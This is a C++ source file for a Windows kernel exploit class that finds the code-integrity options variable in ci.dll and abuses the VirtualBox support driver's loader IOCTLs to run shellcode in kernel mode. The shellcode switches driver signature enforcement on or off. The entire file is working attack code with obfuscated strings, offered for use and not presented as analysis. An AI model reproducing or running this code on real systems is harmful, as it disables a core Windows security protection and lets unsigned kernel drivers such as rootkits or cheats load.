#include <inc.h>
DWORD64 driver::c_exploit::kernelbase(LPCSTR mod)
{
	LPVOID DriverList[1024];
	DWORD cbNeeded;
	if (EnumDeviceDrivers(DriverList, sizeof(DriverList), &cbNeeded) == 0) return 0;
	int cDrivers = cbNeeded / sizeof(LPVOID);
	for (auto i = 0; i < cDrivers; i++) 
	{
		char szBaseName[MAX_PATH];
		if (!GetDeviceDriverBaseNameA(DriverList[i], szBaseName, sizeof(szBaseName))) continue;
		if (_strcmpi(mod, szBaseName) == 0) return (DWORD64)DriverList[i];
	}
	return 0;
}
DWORD64 driver::c_exploit::optionaddr(HMODULE base, DWORD build)
{
	hde64s hs;
	PBYTE CiInitialize = (PBYTE)GetProcAddress(base, stra("CiInitialize"));
	if (!CiInitialize) return 0;
	int c = 0, j = 0;
	for (c = 0; c < 0x100;) 
	{
		if (build > 16199) 
		{
			if (CiInitialize[c] == 0xE8)
				j++;

			if (j > 1)
				break;
		}
		else {
			if (CiInitialize[c] == 0xE9)
				break;
		}

		hde64_disasm(CiInitialize + c, &hs);
		if (hs.flags & F_ERROR)
			return 0;
		c += hs.len;
	}
	CiInitialize = CiInitialize + c + 5 + *(PINT32)(CiInitialize + c + 1);
	for (c = 0; c < 0x100;) 
	{
		if (*(PWORD)(CiInitialize + c) == 0x0d89)
			break;
		hde64_disasm(CiInitialize + c, &hs);
		if (hs.flags & F_ERROR)
			return 0;
		c += hs.len;
	}
	CiInitialize = CiInitialize + c + 6 + *(PINT32)(CiInitialize + c + 2);
	return (DWORD64)(CiInitialize - (PBYTE)base);
}
DWORD64 driver::c_exploit::cioption()
{
	RTL_OSVERSIONINFOW Version = { 0 };
	Version.dwOSVersionInfoSize = sizeof(Version);
	RtlGetVersion((PRTL_OSVERSIONINFOW)&Version);
	if (Version.dwMajorVersion < 6) return 0;
	DWORD64 KernelBase = this->kernelbase(stra("ci.dll"));
	if (KernelBase == 0) return 0;
	HMODULE UserBase = LoadLibraryExA(stra("ci.dll"), NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (UserBase == 0) return 0;
	DWORD64 Offset = this->optionaddr(UserBase, Version.dwBuildNumber);
	FreeLibrary(UserBase);
	if (Offset == 0) return 0;
	return KernelBase + Offset;
}
void driver::c_exploit::exploit(bool toggle, DWORD64 ciaddr)
{
	unsigned char scDisable[] = {
		0xA1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x24, 0xF9, 0xC3
	};
	unsigned char scEnable[] = {
		0xA1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0C, 0x06, 0xC3
	};

	auto hDevice = CreateFile(
		VBoxSymLink,
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (hDevice == INVALID_HANDLE_VALUE) return;

	PBYTE Shellcode;
	DWORD CodeSize;

	if (toggle)
	{
		Shellcode = scEnable;
		CodeSize = sizeof(scEnable);
		*(PDWORD64)(Shellcode + 1) = ciaddr;
	}
	else 
	{
		Shellcode = scDisable;
		CodeSize = sizeof(scDisable);
		*(PDWORD64)(Shellcode + 1) = ciaddr;
	}

	SUPCOOKIE Cookie;
	RtlSecureZeroMemory(&Cookie, sizeof(SUPCOOKIE));
	Cookie.Hdr.u32Cookie = SUPCOOKIE_INITIAL_COOKIE;
	Cookie.Hdr.cbIn = SUP_IOCTL_COOKIE_SIZE_IN;
	Cookie.Hdr.cbOut = SUP_IOCTL_COOKIE_SIZE_OUT;
	Cookie.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
	Cookie.Hdr.rc = 0;
	Cookie.u.In.u32ReqVersion = 0;
	Cookie.u.In.u32MinVersion = 0x00070002;
	RtlCopyMemory(Cookie.u.In.szMagic, SUPCOOKIE_MAGIC, sizeof(SUPCOOKIE_MAGIC));

	DWORD bytesIO;

	if (!DeviceIoControl(hDevice, SUP_IOCTL_COOKIE,
		&Cookie, SUP_IOCTL_COOKIE_SIZE_IN, &Cookie,
		SUP_IOCTL_COOKIE_SIZE_OUT, &bytesIO, NULL))
		return;

	SUPLDROPEN OpenLdr;
	DWORD BufferSize = CodeSize + 0x1000;

	RtlSecureZeroMemory(&OpenLdr, sizeof(OpenLdr));
	OpenLdr.Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
	OpenLdr.Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
	OpenLdr.Hdr.cbIn = SUP_IOCTL_LDR_OPEN_SIZE_IN;
	OpenLdr.Hdr.cbOut = SUP_IOCTL_LDR_OPEN_SIZE_OUT;
	OpenLdr.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
	OpenLdr.Hdr.rc = 0;
	OpenLdr.u.In.cbImage = BufferSize;
	RtlCopyMemory(OpenLdr.u.In.szName, supImageName, sizeof(supImageName));

	if (!DeviceIoControl(hDevice, SUP_IOCTL_LDR_OPEN, &OpenLdr,
		SUP_IOCTL_LDR_OPEN_SIZE_IN, &OpenLdr,
		SUP_IOCTL_LDR_OPEN_SIZE_OUT, &bytesIO, NULL))
		return;

	RTR0PTR ImageBase = OpenLdr.u.Out.pvImageBase;
	SIZE_T memIO = BufferSize;

	BYTE LoadTask[0x1000] = { 0 };
	PSUPLDRLOAD pLoadTask = (PSUPLDRLOAD)LoadTask;

	pLoadTask->Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
	pLoadTask->Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
	pLoadTask->Hdr.cbIn = (ULONG_PTR)(&((PSUPLDRLOAD)0)->u.In.achImage) + BufferSize;
	pLoadTask->Hdr.cbOut = SUP_IOCTL_LDR_LOAD_SIZE_OUT;
	pLoadTask->Hdr.fFlags = SUPREQHDR_FLAGS_MAGIC;
	pLoadTask->Hdr.rc = 0;
	pLoadTask->u.In.eEPType = SUPLDRLOADEP_VMMR0;
	pLoadTask->u.In.pvImageBase = ImageBase;
	pLoadTask->u.In.EP.VMMR0.pvVMMR0 = (RTR0PTR)supImageHandle;
	pLoadTask->u.In.EP.VMMR0.pvVMMR0EntryEx = ImageBase;
	pLoadTask->u.In.EP.VMMR0.pvVMMR0EntryFast = ImageBase;
	pLoadTask->u.In.EP.VMMR0.pvVMMR0EntryInt = ImageBase;
	RtlCopyMemory(pLoadTask->u.In.achImage, Shellcode, BufferSize - 0x1000);
	pLoadTask->u.In.cbImage = BufferSize;

	if (!DeviceIoControl(hDevice, SUP_IOCTL_LDR_LOAD,
		pLoadTask, pLoadTask->Hdr.cbIn,
		pLoadTask, SUP_IOCTL_LDR_LOAD_SIZE_OUT, &bytesIO, NULL))
		return;

	SUPSETVMFORFAST vmFast;
	RtlSecureZeroMemory(&vmFast, sizeof(vmFast));
	vmFast.Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
	vmFast.Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
	vmFast.Hdr.rc = 0;
	vmFast.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
	vmFast.Hdr.cbIn = SUP_IOCTL_SET_VM_FOR_FAST_SIZE_IN;
	vmFast.Hdr.cbOut = SUP_IOCTL_SET_VM_FOR_FAST_SIZE_OUT;
	vmFast.u.In.pVMR0 = (UINT64)supImageHandle;

	if (!DeviceIoControl(hDevice, SUP_IOCTL_SET_VM_FOR_FAST,
		&vmFast, SUP_IOCTL_SET_VM_FOR_FAST_SIZE_IN,
		&vmFast, SUP_IOCTL_SET_VM_FOR_FAST_SIZE_OUT, &bytesIO, NULL))
		return;

	user::p_data->log(stra(std::string("user changed ci-option to ").append(std::to_string(toggle)).append(" at address ").append(std::to_string(ciaddr)).c_str()));

	DeviceIoControl(hDevice, SUP_IOCTL_FAST_DO_NOP,
		(LPVOID)ciaddr, 0,
		(LPVOID)ciaddr, 0,
		&bytesIO, NULL);

	SUPLDRFREE      ldrFree;
	RtlSecureZeroMemory(&ldrFree, sizeof(ldrFree));
	ldrFree.Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
	ldrFree.Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
	ldrFree.Hdr.cbIn = SUP_IOCTL_LDR_FREE_SIZE_IN;
	ldrFree.Hdr.cbOut = SUP_IOCTL_LDR_FREE_SIZE_OUT;
	ldrFree.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
	ldrFree.Hdr.rc = 0;
	ldrFree.u.In.pvImageBase = ImageBase;

	DeviceIoControl(hDevice, SUP_IOCTL_LDR_FREE,
		&ldrFree, SUP_IOCTL_LDR_FREE_SIZE_IN,
		&ldrFree, SUP_IOCTL_LDR_FREE_SIZE_OUT, &bytesIO, NULL);
}
driver::c_exploit* driver::p_exploit;